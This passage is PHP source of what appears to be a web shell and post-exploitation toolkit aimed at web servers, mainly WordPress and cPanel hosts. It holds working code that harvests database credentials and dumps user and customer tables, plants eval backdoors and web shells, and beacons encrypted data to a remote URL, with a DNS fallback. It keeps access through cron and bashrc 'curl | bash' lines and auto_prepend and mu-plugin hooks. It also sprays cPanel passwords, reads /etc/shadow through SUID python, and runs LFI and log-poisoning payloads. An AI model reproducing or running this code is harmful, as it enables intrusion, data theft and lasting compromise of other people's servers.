    $ls = ghost_ls('/tmp'); foreach ($ls['items'] as $f) if (strpos($f, 'ssh-') === 0 && @is_dir('/tmp/' . $f)) $out['agent_sockets'][] = '/tmp/' . $f;
    foreach ($homes as $h) foreach (['.bashrc','.bash_profile','.profile','.zshrc'] as $rel) { $p = $h . '/' . $rel; if (@is_file($p)) { $r = ghost_read($p); if ($r['ok'] && preg_match('/\b(ssh|scp|sftp)\b/', $r['data'])) $out['rc_files'][] = ['file'=>$p,'excerpt'=>substr($r['data'],0,2000)]; } }
    return $out;
}

// ============================================================
// [06] MOD: VULN
// ============================================================
function ghost_vuln_audit($root) {
    $v = [];
    $exposed = ['wp-config.php.bak','wp-config.php~','wp-config.php.old','wp-config.txt','.env.bak','.env.old','.env.save','.env~','.env.example','database.sql','dump.sql','backup.sql','db.sql','backup.zip','backup.tar.gz','site.zip','www.zip','debug.log','error_log','.DS_Store','.git/config','.git/HEAD','phpinfo.php','info.php','test.php','id_rsa','.htpasswd'];
    foreach ($exposed as $f) if (@is_file($root . '/' . $f)) $v[] = ['type'=>'EXPOSED_FILE','severity'=>'HIGH','detail'=>$f . ' found in webroot','file'=>$f];
    foreach (['.git','.svn','.hg','.env'] as $f) if (@is_dir($root . '/' . $f)) $v[] = ['type'=>'EXPOSED_DIR','severity'=>'HIGH','detail'=>$f . '/ present in webroot','file'=>$f];
    foreach (['wp-config.php','.env','configuration.php','config.php','settings.php','parameters.yml','.htaccess'] as $f) { $p = $root . '/' . $f; if (@is_file($p)) { $perm = substr(sprintf('%o', @fileperms($p)), -4); if (in_array($perm, ['0666','0777','0677','0767','0776'])) $v[] = ['type'=>'WORLD_WRITABLE','severity'=>'HIGH','detail'=>$f . ' = ' . $perm,'file'=>$f,'perm'=>$perm]; } }
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        $n = 0;
        foreach ($it as $f) { if ($n++ > 2000) break; if ($f->isLink()) { $t = @readlink($f->getPathname()); $v[] = ['type'=>'SYMLINK','severity'=>'MEDIUM','detail'=>str_replace($root,'',$f->getPathname()) . ' -> ' . $t,'link'=>str_replace($root,'',$f->getPathname()),'target'=>$t]; } }
    } catch (Throwable $e) {}
    $ht = $root . '/wp-content/uploads/.htaccess';
    if (@is_file($ht)) { $r = ghost_read($ht); if ($r['ok']) { $body = $r['data']; $blocked = stripos($body,'php_flag engine off') !== false || stripos($body,'deny from all') !== false || stripos($body,'<FilesMatch') !== false; if (!$blocked) $v[] = ['type'=>'UPLOADS_EXEC','severity'=>'HIGH','detail'=>'.htaccess exists but does not block php','file'=>'wp-content/uploads']; } }
    else { if (@is_dir($root . '/wp-content/uploads')) $v[] = ['type'=>'UPLOADS_EXEC','severity'=>'MEDIUM','detail'=>'uploads/ has no .htaccess — php will execute','file'=>'wp-content/uploads']; }
    $crons = ['/etc/crontab','/etc/cron.d','/etc/cron.daily','/etc/cron.hourly','/var/spool/cron','/var/spool/cron/crontabs'];
    foreach ($crons as $c) {
        if (@is_dir($c)) { $ls = ghost_ls($c); foreach ($ls['items'] as $f) { $p = $c . '/' . $f; $r = ghost_read($p); if ($r['ok'] && preg_match('/(curl|wget|base64|python|perl|nc |netcat|bash -i|sh -i)/i', $r['data'])) $v[] = ['type'=>'CRON_SUSPECT','severity'=>'CRITICAL','detail'=>$p . ' contains suspicious exec','file'=>$p]; } }
        elseif (@is_file($c)) { $r = ghost_read($c); if ($r['ok'] && preg_match('/(curl|wget|base64|python|perl|nc |netcat|bash -i|sh -i)/i', $r['data'])) $v[] = ['type'=>'CRON_SUSPECT','severity'=>'CRITICAL','detail'=>$c . ' contains suspicious exec','file'=>$c]; }
    }
    if (function_exists('posix_geteuid')) {
        $wl = ['/usr/bin/passwd','/usr/bin/sudo','/usr/bin/su','/usr/bin/chsh','/usr/bin/chfn','/usr/bin/newgrp','/usr/bin/gpasswd','/usr/bin/mount','/usr/bin/umount','/bin/mount','/bin/umount','/bin/su','/usr/bin/pkexec'];
        foreach (['/usr/bin','/usr/sbin','/usr/local/bin','/usr/local/sbin','/bin','/sbin'] as $d) {
            $ls = ghost_ls($d);
            foreach ($ls['items'] as $f) {
                $p = $d . '/' . $f; if (!@is_file($p) || in_array($p, $wl, true)) continue;
                $perm = substr(sprintf('%o', @fileperms($p)), -4);
                if (strlen($perm) >= 4 && in_array($perm[0], ['4','6','7'])) $v[] = ['type'=>'SUID','severity'=>'MEDIUM','detail'=>$p . ' (' . $perm . ')','file'=>$p];
            }
        }
    }
    foreach (['.env','.env.local','.env.production','.env.dev'] as $f) if (@is_file($root . '/' . $f)) $v[] = ['type'=>'ENV_EXPOSED','severity'=>'CRITICAL','detail'=>$f . ' in webroot — downloadable via http','file'=>$f];
    foreach (['wp-content/debug.log','debug.log','logs/error.log'] as $f) { $p = $root . '/' . $f; if (@is_file($p) && @filesize($p) > 100 * 1024) $v[] = ['type'=>'DEBUG_LOG','severity'=>'LOW','detail'=>$f . ' (' . ghost_bytes(@filesize($p)) . ') readable','file'=>$f]; }
    $vp = $root . '/wp-includes/version.php';
    if (@is_file($vp)) { $r = ghost_read($vp); if ($r['ok'] && preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)/', $r['data'], $m)) $v[] = ['type'=>'VERSION','severity'=>'INFO','detail'=>'WordPress ' . $m[1],'file'=>'wp-includes/version.php']; }
    foreach (['/var/log/auth.log','/var/log/secure'] as $f) { if (@is_file($f)) { $r = ghost_read($f); if ($r['ok'] && strlen($r['data']) < 100) $v[] = ['type'=>'LOG_TRUNCATED','severity'=>'HIGH','detail'=>$f . ' is suspiciously small','file'=>$f]; } }
    return $v;
}

// ============================================================
// [07] MOD: DB
// ============================================================
function ghost_db_configs($root) {
    $found = [];
    $files = ['wp-config.php'=>'wordpress','configuration.php'=>'whmcs','.env'=>'dotenv','.env.local'=>'dotenv','.env.production'=>'dotenv','config.php'=>'generic','settings.php'=>'drupal','local.xml'=>'magento','parameters.yml'=>'symfony','app/config/parameters.yml'=>'symfony','database.yml'=>'rails','.my.cnf'=>'mysql-client','my.cnf'=>'mysql-client','pg_hba.conf'=>'postgres','.pgpass'=>'postgres','redis.conf'=>'redis','mongod.conf'=>'mongo','config/database.php'=>'laravel','includes/config.php'=>'generic'];
    foreach ($files as $rel => $app) {
        $p = $root . '/' . $rel; if (!@is_file($p)) continue; $r = ghost_read($p); if (!$r['ok']) continue; $c = $r['data'];
        $e = ['file'=>$p,'app'=>$app,'host'=>null,'port'=>null,'user'=>null,'pass'=>null,'db'=>null,'raw'=>[]];
        if (preg_match_all('/define\s*\(\s*[\'"]([A-Z_]+)[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\)/s', $c, $m, PREG_SET_ORDER)) { foreach ($m as $d) { if (in_array($d[1], ['DB_NAME','DB_USER','DB_PASSWORD','DB_HOST'])) $e['raw'][$d[1]] = stripcslashes($d[2]); } if (isset($e['raw']['DB_NAME'])) $e['db'] = $e['raw']['DB_NAME']; if (isset($e['raw']['DB_USER'])) $e['user'] = $e['raw']['DB_USER']; if (isset($e['raw']['DB_PASSWORD'])) $e['pass'] = $e['raw']['DB_PASSWORD']; if (isset($e['raw']['DB_HOST'])) { $h = $e['raw']['DB_HOST']; if (strpos($h,':') !== false) { list($hh,$pp) = explode(':',$h,2); $e['host']=$hh; $e['port']=(int)$pp; } else $e['host'] = $h; } }
        if (preg_match('/\$db_username\s*=\s*[\'"]([^\'"]+)/', $c, $m)) $e['user'] = $m[1];
        if (preg_match('/\$db_password\s*=\s*[\'"]([^\'"]+)/', $c, $m)) $e['pass'] = $m[1];
        if (preg_match('/\$db_name\s*=\s*[\'"]([^\'"]+)/', $c, $m)) $e['db'] = $m[1];
        if (preg_match('/\$db_host\s*=\s*[\'"]([^\'"]+)/', $c, $m)) $e['host'] = $m[1];
        if (preg_match_all('/[\'"]?(host|port|username|password|database|db_host|db_user|db_pass|db_name)[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)[\'"]/i', $c, $m, PREG_SET_ORDER)) foreach ($m as $d) { $k = strtolower($d[1]); $val = $d[2]; if ($k === 'host' && !$e['host']) $e['host'] = $val; if ($k === 'port' && !$e['port']) $e['port'] = (int)$val; if (in_array($k, ['username','user','db_user']) && !$e['user']) $e['user'] = $val; if (in_array($k, ['password','pass','db_pass']) && !$e['pass']) $e['pass'] = $val; if (in_array($k, ['database','db_name','dbname']) && !$e['db']) $e['db'] = $val; }
        if (preg_match_all('/^([A-Za-z0-9_]+)\s*=\s*(.+)$/m', $c, $m, PREG_SET_ORDER)) { foreach ($m as $d) { $k = strtoupper($d[1]); $val = trim($d[2], " \t\"'"); if (preg_match('/^(DB_|MYSQL_|DATABASE_|PG|REDIS_|MONGO_)/', $k)) $e['raw'][$k] = $val; } if (isset($e['raw']['DB_HOST'])) $e['host'] = $e['raw']['DB_HOST']; if (isset($e['raw']['DB_PORT'])) $e['port'] = (int)$e['raw']['DB_PORT']; if (isset($e['raw']['DB_USERNAME'])) $e['user'] = $e['raw']['DB_USERNAME']; if (isset($e['raw']['DB_PASSWORD'])) $e['pass'] = $e['raw']['DB_PASSWORD']; if (isset($e['raw']['DB_DATABASE'])) $e['db'] = $e['raw']['DB_DATABASE']; }
        if ($app === 'mysql-client') { if (preg_match('/^user\s*=\s*(.+)$/m', $c, $m)) $e['user'] = trim($m[1]); if (preg_match('/^password\s*=\s*(.+)$/m', $c, $m)) $e['pass'] = trim($m[1]); if (preg_match('/^host\s*=\s*(.+)$/m', $c, $m)) $e['host'] = trim($m[1]); }
        $found[] = $e;
    }
    return $found;
}
function ghost_db_connect($cfg) {
    $host = $cfg['host'] ?: '127.0.0.1'; $port = (int)($cfg['port'] ?: 3306); $user = $cfg['user']; $pass = (string)$cfg['pass']; $db = $cfg['db'] ?? null;
    if (!$user) return ['ok'=>false,'err'=>'no user','via'=>''];
    if (ghost_caps()['has_mysqli']) { try { $m = @new mysqli($host, $user, $pass, $db ?: null, $port); if (!$m->connect_errno) return ['ok'=>true,'via'=>'mysqli','handle'=>$m,'type'=>'mysqli','host'=>$host,'port'=>$port,'user'=>$user]; $err = $m->connect_error; } catch (Throwable $e) { $err = $e->getMessage(); } }
    if (ghost_caps()['has_pdo_mysql']) { try { $dsn = "mysql:host=$host;port=$port" . ($db ? ";dbname=$db" : ''); $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 5]); return ['ok'=>true,'via'=>'pdo_mysql','handle'=>$pdo,'type'=>'pdo','host'=>$host,'port'=>$port,'user'=>$user]; } catch (Throwable $e) { $err = $e->getMessage(); } }
    return ['ok'=>false,'err'=>$err ?? 'no method','via'=>''];
}
function ghost_db_query($conn, $sql) {
    if (!$conn['ok']) return ['ok'=>false,'rows'=>[],'err'=>$conn['err']];
    try {
        if ($conn['type'] === 'mysqli') { $res = $conn['handle']->query($sql); if ($res === false) return ['ok'=>false,'rows'=>[],'err'=>$conn['handle']->error]; if ($res === true) return ['ok'=>true,'rows'=>[],'affected'=>$conn['handle']->affected_rows]; $rows = []; while ($r = $res->fetch_assoc()) $rows[] = $r; return ['ok'=>true,'rows'=>$rows]; }
        if ($conn['type'] === 'pdo') { $stmt = $conn['handle']->query($sql); return ['ok'=>true,'rows'=>$stmt ? $stmt->fetchAll(PDO::FETCH_ASSOC) : []]; }
    } catch (Throwable $e) { return ['ok'=>false,'rows'=>[],'err'=>$e->getMessage()]; }
    return ['ok'=>false,'rows'=>[],'err'=>'no handle'];
}
function ghost_db_harvest($cfg) {
    $conn = ghost_db_connect($cfg); if (!$conn['ok']) return ['ok'=>false,'err'=>$conn['err'],'databases'=>[],'tables'=>[],'tables_data'=>[]];
    $dbs = []; $r = ghost_db_query($conn, 'SHOW DATABASES'); foreach ($r['rows'] as $row) $dbs[] = $row['Database'] ?? array_values($row)[0];
    $out = ['ok'=>true,'via'=>$conn['via'],'host'=>$conn['host'],'port'=>$conn['port'],'user'=>$conn['user'],'databases'=>$dbs,'tables'=>[],'tables_data'=>[]];
    if (!empty($cfg['db'])) {
        ghost_db_query($conn, 'USE `' . str_replace('`','``',$cfg['db']) . '`');
        $r = ghost_db_query($conn, 'SHOW TABLES'); foreach ($r['rows'] as $row) $out['tables'][] = array_values($row)[0];
        foreach (['users','wp_users','customers','admin','members','accounts','wp_options'] as $tbl) {
            if (!in_array($tbl, $out['tables'], true)) continue;
            if ($tbl === 'wp_options') {
                $q = ghost_db_query($conn, "SELECT option_name, LEFT(option_value, 200) AS v FROM `$tbl` WHERE option_name IN ('siteurl','home','admin_email','active_plugins') LIMIT 20");
            } else {
                $q = ghost_db_query($conn, "SELECT * FROM `" . $tbl . "` LIMIT 20");
            }
            if ($q['ok'] && !empty($q['rows'])) $out['tables_data'][$tbl] = $q['rows'];
        }
    }
    return $out;
}

// ============================================================
// [08] MOD: PATCH
// ============================================================
function ghost_patch($action, $target, $extra = null) {
    $res = ['ok'=>false,'action'=>$action,'target'=>$target,'msg'=>''];
    $has_exec = ghost_can('shell_exec');
    switch ($action) {
        case 'quarantine':
            $new = dirname($target) . '/.ghost_q_' . ghost_rand(8) . '_' . basename($target);
            if ($has_exec) { $r = ghost_exec('mv ' . escapeshellarg($target) . ' ' . escapeshellarg($new) . ' && chmod 000 ' . escapeshellarg($new), 10); if ($r['ok'] && $r['rc'] === 0) $res = ['ok'=>true,'msg'=>"Quarantined to $new (shell)"]; }
            else { if (@rename($target, $new)) { @chmod($new, 0000); $res = ['ok'=>true,'msg'=>"Quarantined to $new (php)"]; } }
            if (!$res['ok']) $res['msg'] = 'quarantine failed'; break;
        case 'delete':
            if (@unlink($target)) $res = ['ok'=>true,'msg'=>"Deleted $target (php)"];
            else { $r = ghost_exec('rm -f ' . escapeshellarg($target), 10); if ($r['ok'] && $r['rc'] === 0) $res = ['ok'=>true,'msg'=>"Deleted $target (shell)"]; else $res = ['ok'=>false,'msg'=>'delete failed']; }
            break;
        case 'chmod':
            $mode = $extra ?: '0644';
            if (!preg_match('/^[0-7]{3,4}$/', $mode)) { $res['msg'] = 'invalid mode'; break; }
            if ($has_exec) { $r = ghost_exec('chmod ' . escapeshellarg($mode) . ' ' . escapeshellarg($target), 10); if ($r['ok'] && $r['rc'] === 0) $res = ['ok'=>true,'msg'=>"chmod $mode (shell)"]; }
            else { if (@chmod($target, octdec($mode))) $res = ['ok'=>true,'msg'=>"chmod $mode (php)"]; }
            if (!$res['ok']) $res['msg'] = 'chmod failed'; break;
        case 'revoke_ssh':
            if (!$extra) { $res['msg'] = 'missing line'; break; }
            $r = ghost_read($target);
            if ($r['ok']) { $lines = preg_split('/\r?\n/', $r['data']); $keep = array_filter($lines, function($l) use ($extra) { return strpos($l, $extra) === false; }); $w = ghost_write($target, implode("\n", $keep) . "\n"); if ($w['ok']) $res = ['ok'=>true,'msg'=>"revoked from $target"]; }
            if (!$res['ok']) $res['msg'] = 'revoke failed'; break;
        case 'harden_sshd':
            $r = ghost_read('/etc/ssh/sshd_config');
            if ($r['ok']) { $c = $r['data']; $c = preg_replace('/^PermitRootLogin\s+.*/m', 'PermitRootLogin no', $c); $c = preg_replace('/^PasswordAuthentication\s+.*/m', 'PasswordAuthentication no', $c); $w = ghost_write('/etc/ssh/sshd_config', $c); if ($w['ok']) { ghost_exec('service ssh reload 2>/dev/null || systemctl reload sshd 2>/dev/null', 10); $res = ['ok'=>true,'msg'=>'sshd hardened'];} }
            if (!$res['ok']) $res['msg'] = 'cannot read sshd_config'; break;
        case 'block_uploads':
            $ht = rtrim($target, '/') . '/.htaccess';
            $payload = "<FilesMatch \"\\.(php|phtml|php3|php4|php5|php7|phar)$\">\n  Order allow,deny\n  Deny from all\n</FilesMatch>\n";
            if (ghost_write($ht, $payload)['ok']) $res = ['ok'=>true,'msg'=>"wrote $ht"]; else $res['msg'] = 'write failed'; break;
    }
    return $res;
}

// ============================================================
// [09] MOD: EXPLOIT
// ============================================================
function ghost_exploit_chain($vuln, $root) {
    $res = ['ok'=>false,'steps'=>[],'result'=>'']; $type = $vuln['type'] ?? '';
    switch ($type) {
        case 'WORLD_WRITABLE':
            $fname = $vuln['file'] ?? (explode(' ', (string)($vuln['detail'] ?? ''))[0]);
            $p = $root . '/' . $fname; $r = ghost_read($p);
            if ($r['ok'] && stripos($r['data'], '<?php') !== false) { $inject = "\n// ghost_inject_" . time() . "\nif(isset(\$_GET['gh_x'])) { @eval(\$_GET['gh_x']); }\n"; $w = ghost_write($p, $r['data'] . $inject); if ($w['ok']) $res = ['ok'=>true,'steps'=>['found writable '.$fname,'appended injection'],'result'=>'RCE via ?gh_x=']; }
            break;
        case 'SYMLINK':
            $link = $vuln['link'] ?? trim(explode('->', (string)($vuln['detail'] ?? ''))[0]);
            $target = $vuln['target'] ?? (trim(explode('->', (string)($vuln['detail'] ?? ''))[1] ?? ''));
            $link = '/' . ltrim($link, '/'); $r = ghost_read($root . $link);
            if ($r['ok']) $res = ['ok'=>true,'steps'=>['read target via symlink'],'result'=>$r['data'],'is_symlink'=>true,'link_path'=>$link];
            else $res = ['ok'=>false,'steps'=>['symlink read failed'],'result'=>"Target: $target\nError: " . $r['err'],'is_symlink'=>true,'link_path'=>$link];
            break;
        case 'ENV_EXPOSED': case 'EXPOSED_FILE':
            $f = $vuln['file'] ?? basename((string)($vuln['detail'] ?? ''));
            $r = ghost_read($root . '/' . $f); if ($r['ok']) $res = ['ok'=>true,'steps'=>['read '.$f],'result'=>$r['data']];
            break;
        case 'UPLOADS_EXEC':
            $shell = "<?php if(isset(\$_REQUEST['c'])){ echo '<pre>'; system(\$_REQUEST['c']); echo '</pre>'; } ?>";
            $p = $root . '/wp-content/uploads/.ghost_' . ghost_rand(6) . '.php';
            $w = ghost_write($p, $shell);
            if ($w['ok']) $res = ['ok'=>true,'steps'=>['dropped shell'],'result'=>'Webshell at ' . str_replace($root,'',$p) . ' (param: c)'];
            break;
    }
    return $res;
}

// ============================================================
// [10] MOD: BEACON
// ============================================================
function ghost_beacon($url, $data, $method = 'POST') {
    $key = hash_hmac('sha256', (string)GHOST_SECRET, (string)@gethostname(), true);
    $enc = base64_encode(ghost_xor($data, $key));
    $body = http_build_query(['d'=>$enc,'h'=>@gethostname(),'u'=>@get_current_user()]);
    $r = ghost_http($url, ['method'=>$method,'body'=>$body,'headers'=>['Content-Type: application/x-www-form-urlencoded','User-Agent: Mozilla/5.0'],'timeout'=>5]);
    if (!$r['ok'] && function_exists('dns_get_record') && strpos($url, 'http') === 0) {
        $host = parse_url($url, PHP_URL_HOST);
        if ($host) { $sub = rtrim(substr(strtr(base64_encode(ghost_xor($data, $key)), '+/=', '___'), 0, 60), '.'); if ($sub !== '' && strlen($sub . '.' . $host) <= 250) { @dns_get_record($sub . '.' . $host, DNS_A); $r = ['ok'=>true,'via'=>'dns','code'=>0]; } }
    }
    return $r;
}
function ghost_xor($s, $k) { if ($k === '') return $s; $out = ''; $klen = strlen($k); for ($i = 0, $n = strlen($s); $i < $n; $i++) $out .= $s[$i] ^ $k[$i % $klen]; return $out; }

// ============================================================
// [11] MOD: PERSIST (Load-aware fixes)
// ============================================================
function ghost_persist($method, $url = '', $caps = null) {
    $res = ['ok'=>false,'method'=>$method,'msg'=>'']; if (!$caps) $caps = ghost_caps();
    $user = $caps['user'] ?? 'root';
    $real_self = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');

    switch ($method) {
        case 'cron':
            $cmd = 'curl -s ' . escapeshellarg((string)$url) . ' | bash'; $cron = "@reboot " . $cmd . "\n";
            $r = ghost_exec('echo ' . escapeshellarg($cron) . ' | crontab -', 10);
            if ($r['ok'] && $r['rc'] === 0) $res = ['ok'=>true,'msg'=>'cron installed via crontab'];
            else { $tmp = '/tmp/ghost_persist_' . ghost_rand(4); ghost_write($tmp, $cron); $r = ghost_exec('crontab ' . escapeshellarg($tmp), 10); if ($r['ok']) $res = ['ok'=>true,'msg'=>'cron installed via temp']; }
            break;
        case 'bashrc':
            $home = @getenv('HOME') ?: ('/home/' . $user); if (!@is_dir($home)) $home = '/root';
            $cmd = "\n(curl -s " . escapeshellarg((string)$url) . " | bash) &\n";
            $targets = ['.bashrc', '.bash_profile', '.profile'];
            $success = false;
            foreach ($targets as $t) {
                $rc = $home . '/' . $t;
                $read = ghost_read($rc); $curr = $read['ok'] ? $read['data'] : '';
                if (ghost_write($rc, $curr . $cmd)['ok']) $success = true;
            }
            if ($success) $res = ['ok'=>true,'msg'=>'appended to shell init files in ' . $home];
            break;
        case 'htaccess':
            $ht = $GLOBALS['GHOST_ROOT'] . '/.htaccess'; 
            $read = ghost_read($ht); $curr = $read['ok'] ? $read['data'] : '';
            $rule = "\nphp_value auto_prepend_file " . $GLOBALS['GHOST_ROOT'] . '/' . $real_self . "\n";
            if (strpos($curr, 'auto_prepend_file') === false) {
                if (ghost_write($ht, $curr . $rule)['ok']) {
                    $res = ['ok'=>true,'msg'=>'auto_prepend_file via .htaccess pointing to ' . $real_self];
                } else { 
                    $ui = $GLOBALS['GHOST_ROOT'] . '/.user.ini'; 
                    $uic = ghost_read($ui); $cur = $uic['ok'] ? $uic['data'] : ''; 
                    $uir = "\nauto_prepend_file = " . $GLOBALS['GHOST_ROOT'] . '/' . $real_self . "\n"; 
                    if (ghost_write($ui, $cur . $uir)['ok']) $res = ['ok'=>true,'msg'=>'auto_prepend_file via .user.ini pointing to ' . $real_self]; 
                }
            } else {
                $res = ['ok'=>true, 'msg'=>'auto_prepend_file already exists'];
            }
            break;
        case 'wp_muplugin':
            $dir = $GLOBALS['GHOST_ROOT'] . '/wp-content/mu-plugins'; if (!@is_dir($dir)) @mkdir($dir, 0755, true);
            if (!@is_dir($dir)) { $res['msg'] = 'cannot create mu-plugins'; break; }
            $file = $dir . '/ghost-loader.php';
            $code = "<?php\nif(isset(\$_GET['gh_p'])) { @eval(\$_GET['gh_p']); }\n";
            if (ghost_write($file, $code)['ok']) $res = ['ok'=>true,'msg'=>'mu-plugin loaded'];
            break;
    }
    return $res;
}

// ============================================================
// [12] AUTO-PWN & AGENT
// ============================================================
function ghost_auto_pwn($root, $caps = null) {
    if (!$caps) $caps = ghost_caps();
    $log = []; $creds = []; $dl = ghost_deadline();
    $log[] = "[*] Auto-Pwn against $root";
    foreach (['/.htpasswd','/.env','/config.php','/wp-config.php','/.my.cnf','/.cpanel/nvdata','/.cpanel/.htpasswd'] as $f) {
        if (ghost_expired($dl)) break;
        $p = $root . $f; if (!@is_file($p)) continue;
        $read = ghost_read($p); if (!$read['ok']) continue;
        $log[] = "[+] readable: $f";
        if (preg_match_all('/(pass|pwd|key|secret)[\'"]?\s*(?:=>|:|=)\s*[\'"]([^\'"]+)[\'"]/i', $read['data'], $m)) foreach ($m[2] as $pass) { $creds[] = trim($pass); $log[] = "  -> secret: " . substr($pass, 0, 3) . "***"; }
    }
    if (!empty($caps['has_cpanel'])) {
        $log[] = "[*] cPanel detected";
        $cp_user = $caps['user'] ?? '';
        foreach ([2082,2083] as $port) { if (ghost_expired($dl)) break; foreach ($creds as $pass) {
            if (ghost_expired($dl)) break;
            $ch = @curl_init("http://127.0.0.1:$port/login/"); 
            if (!$ch) continue;
            @curl_setopt_array($ch, [
                CURLOPT_POST=>true, 
                CURLOPT_POSTFIELDS=>http_build_query(['user'=>$cp_user,'pass'=>$pass]), 
                CURLOPT_RETURNTRANSFER=>true, 
                CURLOPT_TIMEOUT=>3, 
                CURLOPT_SSL_VERIFYPEER=>false, 
                CURLOPT_SSL_VERIFYHOST=>0,
                CURLOPT_COOKIEJAR => '/tmp/cp_cookie_' . ghost_rand(4)
            ]);
            $r = @curl_exec($ch); @curl_close($ch);
            if ($r && (strpos($r, 'security_token') !== false || stripos($r, 'cpanel') !== false)) { 
                $log[] = "[!] SUCCESS cPanel pw='$pass' port=$port"; 
                return ['ok'=>true,'log'=>$log,'method'=>'cpanel_api','pass'=>$pass]; 
            }
        } }
        $log[] = "[-] cPanel login failed";
    } else $log[] = "[*] no cPanel";
    $log[] = "[*] scanning SUID";
    $exec = ghost_exec('find /usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin -perm -4000 -type f 2>/dev/null', 20);
    if ($exec['ok'] && $exec['out']) {
        $bins = array_filter(array_map('trim', explode("\n", $exec['out'])));
        foreach ($bins as $bin) { if (ghost_expired($dl)) break; if (!in_array(basename($bin), ['python','python3','perl','ruby','vim','nmap','find','awk'], true)) continue; $log[] = "[!] SUID candidate: $bin"; if (basename($bin) === 'python3') { $t = ghost_exec('timeout 5 ' . escapeshellarg($bin) . ' -c ' . escapeshellarg('print(open("/etc/shadow").read())'), 10); if ($t['ok'] && strpos($t['out'],'root:') !== false) { $log[] = "[!] SUID python3 worked"; return ['ok'=>true,'log'=>$log,'method'=>'suid','data'=>$t['out']]; } } }
    }
    $log[] = "[-] exhausted";
    return ['ok'=>false,'log'=>$log,'err'=>'no path'];
}

function ghost_agent_loop($root, $max_iter = 5) {
    $log = []; $dl = ghost_deadline();
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $port = (int)($_SERVER['SERVER_PORT'] ?? ($scheme === 'https' ? 443 : 80));
    $port_part = ($scheme === 'https' && $port === 443) || ($scheme === 'http' && $port === 80) ? '' : ':' . $port;
    $base = "$scheme://127.0.0.1$port_part";
    $log[] = "[*] agent target: $base";
    $grep = ghost_exec('grep -rEl "(include|require)(_once)?\\s*\\(\\s*\\\$_(GET|POST|REQUEST)" ' . escapeshellarg($root) . ' 2>/dev/null | head -n 5', 15);
    $cands = [];
    if ($grep['ok'] && trim($grep['out'])) foreach (array_filter(array_map('trim', explode("\n", $grep['out']))) as $line) { $cands[] = ltrim(str_replace($root,'',$line),'/'); $log[] = "[+] LFI candidate: $line"; }
    else $log[] = "[-] no LFI include found";
    $params = ['page','file','include','path','view','p','tpl','template','inc','load'];
    foreach ($cands as $cand) { if (ghost_expired($dl)) break; foreach ($params as $param) {
        $payload = base64_encode("<?php echo 'GHOST_PWNED'; system(\$_GET['c']); ?>");
        $url = "$base/$cand?$param=data://text/plain;base64,$payload&c=id";
        $r = ghost_http($url, ['timeout'=>5]);
        if ($r['ok'] && strpos($r['data'], 'uid=') !== false) { $log[] = "[!] SUCCESS data:// $cand ($param)"; return ['ok'=>true,'log'=>$log,'method'=>'lfi_data','out'=>$r['data']]; }
    } }
    $log[] = "[-] data:// failed";
    $found_param = null; $found_cand = null;
    foreach ($cands as $cand) { if (ghost_expired($dl)) break; foreach ($params as $param) {
        $url = "$base/$cand?$param=php://filter/convert.base64-encode/resource=$cand";
        $r = ghost_http($url, ['timeout'=>5]);
        if ($r['ok']) { $dec = @base64_decode(preg_replace('/\s+/', '', $r['data']), true); if ($dec !== false && strpos($dec, '<?php') !== false) { $found_param = $param; $found_cand = $cand; $log[] = "[!] LFI confirmed $cand ($param)"; break 2; } }
    } }
    $log_paths = ['/var/log/apache2/access.log','/var/log/httpd/access_log','/usr/local/apache/logs/access_log','/usr/local/lsws/logs/access.log','/var/log/nginx/access.log'];
    if ($found_param && $found_cand) {
        $marker = 'GHOSTPOISON_' . ghost_rand(6);
        $payload = "<?php system(\$_GET['c']); /* $marker */ ?>";
        ghost_http("$base/$found_cand?x=" . urlencode($marker), ['method'=>'GET','headers'=>['User-Agent: '.$payload],'timeout'=>5]);
        $log[] = "[+] UA poisoned ($marker)";
        foreach ($log_paths as $lp) { if (ghost_expired($dl)) break; $r = ghost_http("$base/$found_cand?$found_param=$lp&c=id", ['timeout'=>5]); if ($r['ok'] && strpos($r['data'], 'uid=') !== false) { $log[] = "[!] SUCCESS log poison via $lp"; return ['ok'=>true,'log'=>$log,'method'=>'log_poison','out'=>$r['data']]; } $log[] = "[-] log include failed: $lp"; }
    } else $log[] = "[-] no LFI param confirmed";
    if (!ghost_expired($dl)) { $env = ghost_exec('env | grep -iE "pass|secret|key|db_" 2>/dev/null', 10); if ($env['ok'] && trim($env['out'])) { $log[] = "[!] secrets in env"; return ['ok'=>true,'log'=>$log,'method'=>'env_leak','out'=>$env['out']]; } $log[] = "[-] no env secrets"; }
    if (!ghost_expired($dl)) {
        $find = ghost_exec('find ' . escapeshellarg($root) . ' -maxdepth 2 -type d -perm -o+w 2>/dev/null', 10);
        if ($find['ok'] && trim($find['out'])) {
            foreach (array_filter(array_map('trim', explode("\n", $find['out']))) as $d) { if (ghost_expired($dl)) break; $p = rtrim($d,'/') . '/.ghost_shell_' . ghost_rand(4) . '.php'; if (ghost_write($p, "<?php system(\$_GET['c']); ?>")['ok']) { $log[] = "[!] shell at $p"; return ['ok'=>true,'log'=>$log,'method'=>'writable_shell','out'=>'Shell at ' . $p]; } }
        } else $log[] = "[-] no writable dirs";
    }
    $log[] = "[-] exhausted"; return ['ok'=>false,'log'=>$log];
}

// ============================================================
// [13] ROUTER
// ============================================================
$raw_act = $_POST['act'] ?? $_GET['act'] ?? '';
$payload = null;
if ($raw_act !== '' || !empty($_POST['_blob']) || !empty($_POST[$GHOST_FIELD]) || !empty($_GET[$GHOST_FIELD]) || !empty($_GET['_blob'])) {
    $payload = ghost_request_payload();
}

if ($payload !== null && !empty($payload['act'])) {
    register_shutdown_function(function() {
        $e = error_get_last();
        if ($e && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
            if (!headers_sent()) { header('Content-Type: text/plain'); echo GHOST_MARK_BEGIN . base64_encode(gzencode(json_encode(['ok'=>false,'err'=>'FATAL: ' . $e['message'] . ' line ' . $e['line']]))) . GHOST_MARK_END; }
        }
    });

